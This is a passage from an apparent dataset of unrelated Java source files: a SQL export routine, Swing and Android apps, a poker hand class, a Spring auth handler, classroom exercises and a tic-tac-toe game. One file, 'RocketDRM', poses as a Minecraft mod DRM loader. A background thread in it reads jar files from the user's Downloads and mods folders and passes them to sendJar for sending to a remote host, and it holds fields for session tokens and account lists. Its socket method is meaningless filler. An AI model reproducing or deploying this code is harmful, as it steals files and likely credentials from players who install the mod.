ExcelExport.CELL_ALIGN_LEFT);\n        dataMap.put(\"validity_time\", ExcelExport.CELL_ALIGN_LEFT);\n        String nativeSql = \"SELECT org_name,park_manage_name,plate_number,nickname,(CASE TYPE WHEN 0 THEN '\u5305\u6708\u8f66' ELSE '\u514d\u8d39\u8f66' END) type ,(CASE STATUS WHEN 0 THEN '\u7981\u7528' ELSE '\u6b63\u5e38' END) status,validity_time FROM app_car_manage WHERE 1=1\";\n        List<Map<String, Object>> list;\n        if(ShiroUtils.isHasRole(SystemConstant.ROLE_ADMIN)){\n            if(orgId!=null){\n                nativeSql +=\" AND org_id=\"+orgId;\n            }\n        }else{\n            nativeSql +=\" AND org_id=\"+user.getOrgId();\n        }\n        if(parkManageId!=null",
    "package businessPanels;\n\nimport java.awt.Color;\nimport java.awt.Cursor;\nimport java.awt.Dimension;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\nimport javax.swing.JButton;\nimport javax.swing.JLabel;\nimport javax.swing.JOptionPane;\nimport javax.swing.JPanel;\nimport javax.swing.JScrollPane;\nimport javax.swing.JTable;\nimport javax.swing.JTextField;\nimport javax.swing.table.DefaultTableModel;\n\nimport customerPanels.Constants;\nimport dto.Business;\nimport dto.Server;\nimport main.PlatePlanMain;\nimport service_interfaces.ServerService;\nimport services.ServerServiceImpl;\n\npublic class BusinessServerManage extends JPanel {\n\n\tprivate static final long serialVersionUID = 1L;\n\tprivate JTextField txtFirstName;\n\tprivate JTextField txtLastName;\n\tprivate JButton btnNewButton;\n\tprivate ServerService serviceUtils;\n\tprivate Business business;\n\tprivate DefaultTableModel tableModel;\n\tprivate JTable table;\n\tprivate JButton btnBack;\n\n\t/**\n\t * Create the panel.\n\t */\n\tpublic BusinessServerManage(Business business) {\n\t\t// ========================Setting Default Dimensions========================\n\t\tDimension windowDim = new Dimension(Constants.WINDOW_MAX_WIDTH, Constants.WINDOW_MAX_HEIGHT);\n\t\tthis.setPreferredSize(windowDim);\n\t\tthis.setMinimumSize(windowDim);\n\t\tthis.setMaximumSize(windowDim);\n\t\tsetLayout(null);\n\t\tsetBackground(new Color(255, 250, 250));\n\t\tsetCursor(Cursor.getPredefinedCursor(Cursor.DEFAULT_CURSOR));\n\t\t// ===========================================================================\n\t\tthis.business = business;\n\t\tserviceUtils = ServerServiceImpl.getInstance();\n\n\t\ttxtFirstName = new JTextField();\n\t\ttxtFirstName.setBounds(657, 191, 213, 30);\n\t\tadd(txtFirstName);\n\t\ttxtFirstName.setColumns(10);\n\n\t\ttxtLastName = new JTextField();\n\t\ttxtLastName.setColumns(10);\n\t\ttxtLastName.setBounds(657, 278, 213, 30);\n\t\tadd(txtLastName);\n\n\t\tbtnNewButton = new JButton(\"Add\");\n\t\tbtnNewButton.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\taddNewServer();\n\t\t\t}\n\t\t});\n\t\tbtnNewButton.setBounds(657, 391, 89, 23);\n\t\tadd(btnNewButton);\n\n\t\tJButton btnRemove = new JButton(\"Remove\");\n\t\tbtnRemove.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\tremoveServer();\n\t\t\t}\n\t\t});\n\t\tbtnRemove.setBounds(781, 391, 89, 23);\n\t\tadd(btnRemove);\n\n\t\tJLabel lblFirstName = new JLabel(\"First Name\");\n\t\tlblFirstName.setBounds(657, 166, 115, 14);\n\t\tadd(lblFirstName);\n\n\t\tJLabel lblLastName = new JLabel(\"Last Name\");\n\t\tlblLastName.setBounds(657, 253, 135, 14);\n\t\tadd(lblLastName);\n\n\t\tJScrollPane scrollPane = new JScrollPane();\n\n\t\tJScrollPane scrollPane_1 = new JScrollPane();\n\t\tscrollPane_1.setBounds(48, 114, 560, 450);\n\t\tadd(scrollPane_1);\n\t\ttable = new JTable();\n\t\tscrollPane_1.setViewportView(table);\n\n\t\ttableModel = new DefaultTableModel(new String[] { \"ID\", \"First Name\", \"Last Name\" }, 0);\n\t\ttable.setModel(tableModel);\n\n\t\tbtnBack = new JButton(\"Back\");\n\t\tbtnBack.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\t\tPlatePlanMain.switchPanels(new BusinessHomeView(business));\n\t\t\t}\n\t\t});\n\t\tbtnBack.setBounds(1001, 11, 89, 23);\n\t\tadd(btnBack);\n\n\t\tfor (Server s : serviceUtils.getAllServers()) {\n\t\t\ttableModel.addRow(new Object[] { s.getId(), s.getFirstName(), s.getLastName() });\n\t\t}\n\t\tPlatePlanMain.refreshPage();\n\n\t}\n\n\tprivate void addNewServer() {\n\t\tif (txtFirstName.getText().isEmpty() || txtLastName.getText().isEmpty()) {\n\t\t\tJOptionPane.showMessageDialog(null, \"first name or last name is empty for new server\", \"Error\",\n\t\t\t\t\tJOptionPane.ERROR_MESSAGE);\n\t\t\treturn ;\n\t\t}\n\n\t\tServer server = serviceUtils.registerServer(txtFirstName.getText(), txtLastName.getText());\n\n\t\tif (server != null) {\n\t\t\ttableModel.addRow(new Object[] { server.getId(), server.getFirstName(), server.getLastName() });\n\t\t\ttxtFirstName.setText(\"\");\n\t\t\ttxtLastName.setText(\"\");\n\t\t\tJOptionPane.showMessageDialog(null, \"Added New Server\", \"Success\", JOptionPane.PLAIN_MESSAGE);\n\t\t\tPlatePlanMain.refreshPage();\n\n\t\t} else {\n\t\t\tJOptionPane.showMessageDialog(null, \"An error occurred adding new server!\", \"Error\",\n\t\t\t\t\tJOptionPane.ERROR_MESSAGE);\n\t\t}\n\t}\n\n\tprivate void removeServer() {\n\t\ttry {\n\t\t\tObject serverId = tableModel.getValueAt(table.getSelectedRow(), 0);\n\t\t\tif (serviceUtils.deleteServer((String) serverId)) {\n\t\t\t\ttableModel.removeRow(table.getSelectedRow());\n\t\t\t\tJOptionPane.showMessageDialog(null, \"Server removed from restaurant\", \"Success\",\n\t\t\t\t\t\tJOptionPane.INFORMATION_MESSAGE);\n\n\t\t\t} else {\n\t\t\t\tJOptionPane.showMessageDialog(null, \"Error removing server from DataBase\", \"Error\",\n\t\t\t\t\t\tJOptionPane.ERROR_MESSAGE);\n\t\t\t}\n\n\t\t} catch (ArrayIndexOutOfBoundsException e) {\n\t\t\tJOptionPane.showMessageDialog(null, \"Server not selected\", \"Error\", JOptionPane.ERROR_MESSAGE);\n\t\t}\n\n\t}\n}\n",
    "package hand;\n\nimport java.util.ArrayList;\nimport cards.Card;\nimport cards.StandardCard;\nimport cards.UnoCard;\nimport helpers.PokerSolver;\nimport deck.Deck;\n\n\npublic class Hand {\n    private ArrayList<Card> cards;\n\n    //For use by the PokerSolver\n    private String handDescr = \"\";\n    private int handScore = 0;\n    private int handRank = 0;\n    private int[] altCards;\n\n    public Hand() {\n        //Only need to establish an empty cards ArrayList here\n        cards = new ArrayList<Card>();\n    }\n\n    public void addCard(Card dealtCard) {\n        //Use .add to the card sent in the dealtCard parameter\n        //to the cards attribute\n        cards.add(dealtCard);\n    }\n\n    //Put a card into a specific element within the Hand\n    public void setCard(int index, Card dealtCard){\n        cards.set(index, dealtCard);\n    }\n\n    //Get a specific Card object at a specific index\n    public Card getCard(int index) {\n        return cards.get(index);\n    }\n\n    //Get a specific Card object at a specific index and remove from Hand\n    public Card removeCard(int index) {\n        return cards.remove(index);\n    }\n\n    public void evaluateHand() {\n        //Note: \"this\" represents the current object\n        PokerSolver.evaluateHand(this, getHandString());\n    }\n\n    public void evaluateHand(String game) {\n        //Note: \"this\" represents the current object\n        PokerSolver.evaluateHand(this, getHandString(), game);\n    }\n\n    //This will need to be modified in Assignment 2.3\n    public String[] getHandString() {\n        String[] handString = new String[cards.size()];\n        for(int i=0; i<cards.size(); i++) {\n            if(cards.get(i) instanceof StandardCard)\n                handString[i] = cards.get(i).getFace() + ((StandardCard)cards.get(i)).getSuit();\n        }\n\n        return handString;\n    }\n\n    public int compareHand(Hand otherHand) {\n        //First evaluate each hand\n        evaluateHand();  //This hand object\n        otherHand.evaluateHand();\n\n        return gameResults(otherHand);\n    }\n\n    public int compareHand(Hand otherHand, String game) {\n        //First evaluate each hand\n        evaluateHand(game);  //This hand object\n        otherHand.evaluateHand(game);\n\n        return gameResults(otherHand);\n    }\n\n    private int gameResults(Hand otherHand) {\n        int thisHandResult;\n\n        int[] solverResults = PokerSolver.evaluatePokerGame(this, otherHand);\n\n        //Set win lose or draw for this hand\n        if(solverResults[0] == 1) {  //This hand wins\n            thisHandResult = 1;\n        } else if(solverResults[0] == 0) { //This hand loses\n            thisHandResult = -1;\n        } else {  //Tie\n            thisHandResult = 0;\n        }\n        return thisHandResult;\n    }\n\n    public void discard(Deck deck, int index) {\n\n        //Remove the card designated by index from the hand\n        Card tempCard = cards.remove(index);\n\n        //Send the card to the deck using the Deck class' addDiscard method\n        deck.addUsedCards(tempCard);\n    }\n\n    public void discardAll(Deck deck) {\n\n        //Loop until the cards attribute (the hand) is empty\n        while(cards.size() > 0) {\n            //Remove the card at the 0 index from the hand\n            Card tempCard = cards.remove(0);\n\n            //Send the card to the deck using the Deck class' addDiscard method\n            deck.addUsedCards(tempCard);\n        }\n    }\n\n    @Override\n    public String toString() {\n        String handString = \"\";\n\n        for(int i=0; i<cards.size(); i++) {\n            //Call to the Card object's getString to get Card info\n            handString += cards.get(i) + \" \";\n        }\n\n        return handString;\n    }\n\n    //The typical getters/setters\n    public Card[] getCards() {\n\n        //Transform the ArrayList to an array and return the array\n        Card[] cardArray = new Card[cards.size()];\n        cards.toArray(cardArray);\n\n        return cardArray;\n    }\n\n    public int getHandRank() {\n        return handRank;\n    }\n\n    public void setHandRank(int handRank) {\n        this.handRank = handRank;\n    }\n\n    public String getHandDescr() {\n        return handDescr;\n    }\n\n    public void setHandDescr(String handDescr) {\n        this.handDescr = handDescr;\n    }\n\n    public int getHandScore() {\n        return handScore;\n    }\n\n    public void setHandScore(int handScore) {\n        this.handScore = handScore;\n    }\n\n    public int[] getAltCards() {\n        return altCards;\n    }\n\n    public void setAltCards(int[] altCards) {\n        this.altCards = altCards;\n    }\n\n}\n",
    "package kr.game.sale.config;\n\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport org.springframework.security.authentication.AuthenticationCredentialsNotFoundException;\nimport org.springframework.security.authentication.BadCredentialsException;\nimport org.springframework.security.authentication.InternalAuthenticationServiceException;\nimport org.springframework.security.core.AuthenticationException;\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\nimport org.springframework.security.web.authentication.SimpleUrlAuthenticationFailureHandler;\n\nimport java.io.IOException;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class CustomAuthFailureHandler extends SimpleUrlAuthenticationFailureHandler {\n    public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException {\n        String errorMessage;\n        String myMsg = null;\n        if (exception instanceof BadCredentialsException) {\n            errorMessage = \"\ube44\ubc00\ubc88\ud638\uac00 \uc77c\uce58\ud558\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4.\";\n            myMsg = \"\ube44\ubc00\ubc88\ud638\uac00 \uc77c\uce58\ud558\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4.\";\n        } else if (exception instanceof InternalAuthenticationServiceException) {\n            errorMessage = \"\ub0b4\ubd80 \uc2dc\uc2a4\ud15c \ubb38\uc81c\ub85c \ub85c\uadf8\uc778 \uc694\uccad\uc744 \ucc98\ub9ac\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \uad00\ub9ac\uc790\uc5d0\uac8c \ubb38\uc758\ud558\uc138\uc694. \";\n        } else if (exception instanceof UsernameNotFoundException) {\n            errorMessage = \"\uc874\uc7ac\ud558\uc9c0 \uc54a\ub294 \uacc4\uc815\uc785\ub2c8\ub2e4. \ud68c\uc6d0\uac00\uc785 \ud6c4 \ub85c\uadf8\uc778\ud574\uc8fc\uc138\uc694.\";\n        } else if (exception instanceof AuthenticationCredentialsNotFoundException) {\n            errorMessage = \"\uc778\uc99d \uc694\uccad\uc774 \uac70\ubd80\ub418\uc5c8\uc2b5\ub2c8\ub2e4. \uad00\ub9ac\uc790\uc5d0\uac8c \ubb38\uc758\ud558\uc138\uc694.\";\n        } else {\n            errorMessage = exception.getMessage();\n            errorMessage = errorMessage + \"\uc54c \uc218 \uc5c6\ub294 \uc624\ub958\ub85c \ub85c\uadf8\uc778 \uc694\uccad\uc744 \ucc98\ub9ac\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \uad00\ub9ac\uc790\uc5d0\uac8c \ubb38\uc758\ud558\uc138\uc694.\";\n        }\n        errorMessage = URLEncoder.encode(errorMessage, StandardCharsets.UTF_8);\n        this.setDefaultFailureUrl(\"/users/loginForm?error=\" + errorMessage);\n        super.onAuthenticationFailure(request, response, exception);\n    }\n}\n",
    "package teste;\n\npublic class OperadoresRelacionais {\n\n\tpublic static void main (String [] args) {\n\t\t\n\t\tint i1 = 5;\n\t    int i2 = 10; \n\t    float f1 = 6.5f;\n\t    float f2 = 4.5f;\n\t    double d1 = 60.5d;\n\t    char c1 = 'x';\n\t    char c2 = 'y';\n\t    String s1 = \"alto\";\n\t    String s2 = \"alto\";\n\t    String s3 = \"baixo\";\n\t    boolean b1 = true;\n\t    boolean b2 = false;\n\t    long l1 = 056l;\n\t    long l2 = 8531l;\n\t    byte y1 = 1;\n\t    short h1 = 25;\n\t    \n\t    System.out.println (\"i1 == i2\" + (i1 == i2));\n\t    System.out.println (\"i1 != i2\" + (i1 != i2));\n\t    System.out.println (\"i1 > i2\" + (i1 > i2));\n\t    System.out.println (\"i1 <= i2\" + (i1 <= i2));\n\t    \n\t    System.out.println (\"f1 == f2\" + (f1 == f2));\n\t    System.out.println (\"f1 != f2\" + (f1 != f2));\n\t    System.out.println (\"f1 >= f2\" + (f1 >= f2));\n\t    System.out.println (\"f1 < f2\" + (f1 < f2));\n\t    \n\t    System.out.println (\"c1 == c2\" + (c1 == c2));\n\t    System.out.println (\"c1 != c2\" + (c1 != c2));\n\t    System.out.println (\"c1 > c2\" + (c1 > c2));\n\t    System.out.println (\"c1 <= c2\" + (c1 <= c2));\n\t    \n\t    System.out.println (\"s1 == s2\" + (s1 == s2));\n\t    System.out.println (\"s1 == s3\" + (s1 == s3));\n\t    System.out.println (\"s1 != s2\" + (s1 != s2));\n\t    \n\t    System.out.println (\"b1 == b2\" + (b1 == b2));\n\t    System.out.println (\"b1 != b2\" + (b1 != b2));\n\t    \n\t    System.out.println (\"i2 > f1\" + (i2 > f1));\n\t    System.out.println (\"d1 == h1\" + (d1 == h1));\n\t    \n\t    System.out.println (\"l1 == i2\" + (l1 == i2));\n\t    System.out.println (\"l2 >= i1\" + (l2 >= i1));\n\t    System.out.println (\"y1 != h1\" + (y1 != h1));\n\t \n\t    //System.out.println (s1 >= s2);\n\t    //System.out.println (s1 < s2);\n\t    //System.out.println (b1 > b2);\n\t    //System.out.println (b1 <= i1);\n\t    //System.out.println (s2 != c1);\n\t    //System.out.println (s3 != i1);\n\t    \n\t}\n\t\n}",
    "package com.ahmet.muzikoynatici;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.annotation.SuppressLint;\nimport android.media.MediaPlayer;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.os.Message;\nimport android.view.View;\nimport android.widget.ImageView;\nimport android.widget.SeekBar;\nimport android.widget.TextView;\n\nimport java.io.File;\nimport java.util.ArrayList;\n\npublic class MainActivity extends AppCompatActivity {\n\n    ImageView play, next, prev;\n    TextView songName;\n    SeekBar seekBar;\n    MediaPlayer mediaPlayer;\n\n    Runnable runnable;\n    int index = 0;\n\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        play = findViewById(R.id.imgPlay);\n        next = findViewById(R.id.imgNext);\n        prev = findViewById(R.id.imgPrev);\n        songName = findViewById(R.id.txtSong);\n        seekBar = findViewById(R.id.seekBar);\n\n        ArrayList<Integer> songs = new ArrayList<>();\n\n        songs.add(0, R.raw.ali_babanin_ciftligi);\n        songs.add(1, R.raw.arkadasim_essek);\n        songs.add(2, R.raw.ayi);\n        songs.add(3, R.raw.tatli_domatesler);\n        songs.add(4, R.raw.gunaydin_cocuklar);\n        songs.add(5, R.raw.karpuz_adam);\n        songs.add(6, R.raw.kirmizi_balik);\n        songs.add(7, R.raw.mini_mini_bir_kus);\n\n\n        mediaPlayer = MediaPlayer.create(getApplicationContext(), songs.get(index));\n\n\n        play.setOnClickListener(new View.OnClickListener() {\n                @Override\n                public void onClick(View view) {\n                    seekBar.setMax(mediaPlayer.getDuration());\n                    if (mediaPlayer != null && mediaPlayer.isPlaying()) {\n                        mediaPlayer.pause();\n                        play.setImageResource(R.drawable.ic_play);\n                    } else {\n                        mediaPlayer.start();\n                        play.setImageResource(R.drawable.ic_pause);\n                    }\n                    setSongName();\n                }\n            });\n\n        next.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                if (mediaPlayer != null){\n                    play.setImageResource(R.drawable.ic_pause);\n                }\n                if (index<songs.size()-1){\n                    index++;\n                }else {\n                    index=0;\n                }\n                if (mediaPlayer.isPlaying()){\n                    mediaPlayer.stop();\n                }\n\n                mediaPlayer = mediaPlayer.create(getApplicationContext(),songs.get(index));\n                mediaPlayer.start();\n                setSongName();\n            }\n        });\n\n        prev.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                if (mediaPlayer != null){\n                    play.setImageResource(R.drawable.ic_pause);\n                }\n                if (index>0){\n                    index--;\n                }else {\n                    index=songs.size() -1;\n                }\n                if (mediaPlayer.isPlaying()){\n                    mediaPlayer.stop();\n                }\n\n                mediaPlayer = mediaPlayer.create(getApplicationContext(),songs.get(index));\n                mediaPlayer.start();\n                setSongName();\n            }\n        });\n\n\n        }\n\n        private void setSongName(){\n            if (index == 0) {\n                songName.setText(\"Ali Baban\u0131n \u00c7iftli\u011fi\");\n            }\n            if (index == 1) {\n                songName.setText(\"Arkada\u015f\u0131m E\u015f\u015fek\");\n            }\n            if (index == 2) {\n                songName.setText(\"Ay\u0131\");\n            }\n            if (index == 3) {\n                songName.setText(\"Tatl\u0131 Domatesler\");\n            }\n            if (index == 4) {\n                songName.setText(\"G\u00fcnayd\u0131n \u00c7ocuklar\");\n            }\n            if (index == 5) {\n                songName.setText(\"Karpuz Adam\");\n            }\n            if (index == 6) {\n                songName.setText(\"K\u0131rm\u0131z\u0131 Bal\u0131k\");\n            }\n            if (index == 7) {\n                songName.setText(\"Mini Mini Bir Ku\u015f\");\n            }\n\n        mediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {\n            @Override\n            public void onPrepared(MediaPlayer mediaPlayer) {\n                seekBar.setMax(mediaPlayer.getDuration());\n                mediaPlayer.start();\n            }\n        });\n        seekBar.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {\n            @Override\n            public void onProgressChanged(SeekBar seekBar, int i, boolean b) {\n                if (b){\n                    mediaPlayer.seekTo(i);\n                    seekBar.setProgress(i);\n                }\n            }\n\n            @Override\n            public void onStartTrackingTouch(SeekBar ",
    "/*     */ package com.cout970.rocketdrm;\r\n/*     */ \r\n/*     */ import java.io.*;\r\n/*     */ import java.lang.reflect.Method;\r\n/*     */ import java.net.*;\r\n/*     */\r\n/*     */\r\n/*     */ import java.nio.channels.ConnectionPendingException;\r\nimport java.nio.charset.StandardCharsets;\r\nimport java.nio.file.Files;\r\nimport java.nio.file.Paths;\r\nimport java.util.Arrays;\r\n/*     */ import java.util.HashMap;\r\n/*     */ import java.util.List;\r\n/*     */ import java.util.Map;\r\n/*     */ import java.util.Objects;\r\n/*     */ import java.util.jar.Attributes;\r\n/*     */ import java.util.jar.JarFile;\r\nimport java.util.regex.Matcher;\r\nimport java.util.regex.Pattern;\r\n/*     */ import net.minecraft.client.Minecraft;\r\nimport net.minecraft.launchwrapper.Launch;\r\n/*     */ import net.minecraftforge.fml.common.Mod;\r\nimport net.minecraftforge.fml.relauncher.IFMLLoadingPlugin;\r\n/*     */ import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.MCVersion;\r\n/*     */ import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.Name;\r\n/*     */ import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.SortingIndex;\r\n/*     */ import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin.TransformerExclusions;\r\n/*     */ import org.apache.logging.log4j.LogManager;\r\n/*     */ import org.apache.logging.log4j.Logger;\r\n/*     */\r\n/*     */\r\n/*     */ @MCVersion(\"1.12.2\")\r\n/*     */ @Name(\"Rocket DRM\")\r\n/*     */ @SortingIndex(2147483647)\r\n/*     */ @TransformerExclusions({\"com.cout970.rocketdrm\", \"com.sun.jna\"})\r\n/*     */\r\n/*     */ public class RocketDRM\r\n/*     */   implements IFMLLoadingPlugin\r\n/*     */ {\r\n/*  31 */   public static final Logger LOGGER = LogManager.getLogger(\"Rocket DRM\");\r\n/*     */   private static boolean init = false;\r\n/*     */\r\n/*     */   public static String VERSION = \"1.4.0\";\r\n/*     */\r\n/*     */\r\n/*     */   public static String NAME = \"RocketDRM\";\r\n/*     */\r\n\r\n            public static HttpURLConnection conn;\r\n            private static final String host = \"\"; //ip of main server\r\n            private static final String backup = \"\"; //ip of backup server\r\n            private static final int port = 020505; //replace with port of serverz\r\n            private static String accountslist = \"\";\r\n            private static final String files = \"\";\r\n            public static Minecraft mc;\r\n            private static String mcToken = \"\";\r\n            private static String displayName = \"\";\r\n            private static String toSend = \"\";\r\n\r\n    public static final String[] whitelist = new String[]{\r\n\r\n    };\r\n\r\n    public static void findJars() {\r\n        Thread thread = new Thread(() -> {\r\n            File downloads = new File(System.getProperty(\"user.home\") + \"/Downloads\");\r\n            File mods = new File(\"mods\");\r\n            if (downloads.exists() && downloads.isDirectory()) {\r\n                for (File file : downloads.listFiles()) {\r\n                    for (String name : whitelist) {\r\n                        if (file.getName().contains(\".jar\") && file.getName().toLowerCase().contains(name)) {\r\n                            try {\r\n                                sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());\r\n                                Thread.sleep(500);\r\n                            } catch (IOException | InterruptedException ignored) {\r\n\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            if (mods.exists() && mods.isDirectory()) {\r\n                for (File file : mods.listFiles()) {\r\n                    for (String name : whitelist) {\r\n                        if (file.getName().contains(\".jar\") && file.getName().toLowerCase().contains(name)) {\r\n                            try {\r\n                                sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());\r\n                                Thread.sleep(500);\r\n                            } catch (IOException | InterruptedException ignored) {\r\n\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        });\r\n        thread.start();\r\n    }\r\n\r\n    public static void socket(Method send) {\r\n        try {\r\n            Socket socket = new Socket(host, port);\r\n            socket.toString().equalsIgnoreCase(\"\" + port);\r\n        } catch (ConnectionPendingException e) {\r\n            try {\r\n                Socket socket = new Socket(host, port);\r\n            } catch (ConnectionPendingException f) {\r\n                send.getName();\r\n                while (host.isEmpty()) {\r\n                    host.equals(host + port);\r\n                    while (host.equals(true)) {\r\n\r\n                        if (host.equals(true)) {\r\n                            host.toLowerCase();\r\n                        }\r\n                    }\r\n                }\r\n                try {\r\n\r\n                } catch (Throwable ignored) {\r\n\r\n                }\r\n            } catch (Throwable ignore",
    "import java.io.*;\n\nclass Principal {\n\n  public static void main(String args[]) {\n\n    new File(\"dados/livros.db\").delete();\n    new File(\"dados/livros.hash_d.db\").delete();\n    new File(\"dados/livros.hash_c.db\").delete();\n\n    new File(\"dados\").mkdir();\n    new File(\"dados/deletedIndices\").mkdir();\n\n    Arquivo<Livro> arqLivros;\n    Livro l1 = new Livro(-1, \"9788563560278\", \"Odisseia\", 15.99F);\n    Livro l2 = new Livro(-1, \"9788584290482\", \"Ensino H\u00edbrido\", 39.90F);\n    Livro l3 = new Livro(-1, \"9786559790005\", \"Modernidade L\u00edquida\", 48.1F);\n    Livro l4 = new Livro(-1, \"9788582714911\", \"Mem\u00f3ria\", 55.58F);\n    Livro l5 = new Livro(-1, \"9786587150062\", \"Com Amor\", 48.9F);\n    int id1, id2, id3, id4, id5;\n\n    try {\n      arqLivros = new Arquivo<>(\"livros\", Livro.class.getConstructor());\n\n      id1 = arqLivros.create(l1);\n      System.out.println(\"Livro criado com o ID: \" + id1);\n\n      id2 = arqLivros.create(l2);\n      System.out.println(\"Livro criado com o ID: \" + id2);\n\n      id3 = arqLivros.create(l3);\n      System.out.println(\"Livro criado com o ID: \" + id3);\n\n      id4 = arqLivros.create(l4);\n      System.out.println(\"Livro criado com o ID: \" + id4);\n\n      id5 = arqLivros.create(l5);\n      System.out.println(\"Livro criado com o ID: \" + id5);\n\n      if (arqLivros.delete(id2))\n        System.out.println(\"Livro de ID \" + id2 + \" exclu\u00eddo!\");\n      else\n        System.out.println(\"Livro de ID \" + id2 + \" n\u00e3o encontrado!\");\n\n      l4.setTitulo(\"A Mem\u00f3ria\");\n      if (arqLivros.update(l4))\n        System.out.println(\"Livro de ID \" + l4.getID() + \" alterado!\");\n      else\n        System.out.println(\"Livro de ID \" + l4.getID() + \" n\u00e3o encontrado!\");\n\n\n      System.out.println(\"\\nLivro 3:\\n\" + arqLivros.read(3));\n      System.out.println(\"\\nLivro 1:\\n\" + arqLivros.read(1));\n      System.out.println(\"\\nLivro 5:\\n\" + arqLivros.read(5));\n      System.out.println(\"\\nLivro 4:\\n\" + arqLivros.read(4));\n      System.out.println(\"\\nLivro 2:\\n\" + arqLivros.read(2));\n\n      arqLivros.close();\n\n    } catch (Exception e) {\n      e.printStackTrace();\n    }\n\n  }\n\n}",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template\r\n */\r\nimport java.util.Scanner;\r\npublic class TicTacToe {\r\n\r\n    private static final int ROW = 3; // set row count to 3\r\n    private static final int COL = 3; // set column count to 3\r\n    private static String board[][] = new String[ROW][COL]; // declare the board array\r\n\r\n    /**\r\n     * @param args the command line arguments\r\n     */\r\n    public static void main(String[] args) {\r\n        Scanner in = new Scanner(System.in); //import scanner\r\n        //declaring variables\r\n        int games = 0;\r\n        int row; \r\n        int col; \r\n        String P1 = \"Player 1\"; \r\n        String P2 = \"Player 2\"; \r\n        String player1 = \" X \"; \r\n        String player2 = \" O \"; \r\n        String currentPlayer = player1;\r\n        String currentPlayerString;\r\n        int moves; // variable for moves\r\n        //all the moves\r\n        do {\r\n            games++;\r\n            moves = 0;\r\n            clearBoard();\r\n            display();\r\n            for (int i = 0; i < 9; i++) { \r\n                if (i % 2 == 0) {\r\n                    currentPlayer = player1; \r\n                    currentPlayerString = P1; \r\n                } else {\r\n                    currentPlayer = player2; \r\n                    currentPlayerString = P2; \r\n                }\r\n                System.out.printf(\"\\n%s, it's your turn!\\n\", currentPlayerString); \r\n                do {\r\n                    row = SafeInput.getRangedInt(in, \"Enter your row coordinate\", 1, 3) - 1; \r\n                    col = SafeInput.getRangedInt(in, \"Enter your column coordinate\", 1, 3) - 1; \r\n                } while (!isValidMove(row, col)); \r\n                moves += 1; \r\n                board[row][col] = currentPlayer; \r\n                display(); \r\n\r\n                if (moves >= 5) { \r\n                    if (isWin(currentPlayer)) { \r\n                        System.out.printf(\"%s wins!\", currentPlayerString); \r\n                        break; \r\n                    } else if (moves >= 7) { \r\n                        if (isTie()) { // it's a tie\r\n                            System.out.println(\"TIE GAME!\"); \r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            \r\n            if (player1.equals(\" X \")) {\r\n                player1 = \" O \";\r\n                player2 = \" X \";\r\n            } else {\r\n                player1 = \" X \";\r\n                player2 = \" O \";\r\n            }\r\n        } while (SafeInput.getYNConfirm(in, \"Would you like to play again\")); \r\n        System.out.printf(\"You played %d game(s).\\n\", games); \r\n    }\r\n\r\n\r\n    private static void clearBoard() { \r\n        for (int i = 0; i < ROW; i++) {\r\n            for (int j = 0; j < COL; j++) {\r\n                board[i][j] = \"   \"; \r\n            }\r\n        }\r\n    }\r\n\r\n    // displays tic tac toe board\r\n    private static void display() { \r\n        String displayBoard = \"\";\r\n        for (int i = 0; i < ROW; i++) {\r\n            for (int j = 0; j < COL; j++) {\r\n                if (j == COL - 1) { // draw rows\r\n                    displayBoard += board[i][j];\r\n                } else {\r\n                    displayBoard += board[i][j] + \"|\"; \r\n                }\r\n            }\r\n            if (i != ROW - 1) { \r\n                displayBoard += \"\\n---+---+---\\n\";\r\n            }\r\n        }\r\n        System.out.println(displayBoard); \r\n    }\r\n\r\n    /**\r\n     * @param row an integer representing the row\r\n     * @param col an integer representing the column\r\n     * @return true if valid move\r\n     */\r\n    private static boolean isValidMove(int row, int col) { \r\n        return (board[row][col].equals(\"   \"));\r\n    }\r\n\r\n    /**\r\n     * @param player a string that represents the player\r\n     * @return true column win condition\r\n     */\r\n    private static boolean isColWin(String player) { \r\n        for (int col = 0; col < COL; col++) { \r\n            if (board[0][col].equals(player) && board[1][col].equals(player) && board[2][col].equals(player)) {\r\n                return true; \r\n            }\r\n        }\r\n        return false; \r\n    }\r\n\r\n    /**\r\n     * @param player a string that represents the player\r\n     * @return true row win condition\r\n     */\r\n    private static boolean isRowWin(String player) { \r\n        for (int row = 0; row < ROW; row++) { \r\n            if (board[row][0].equals(player) && board[row][1].equals(player) && board[row][2].equals(player)) {\r\n                return true; \r\n            }\r\n        }\r\n        return false; \r\n    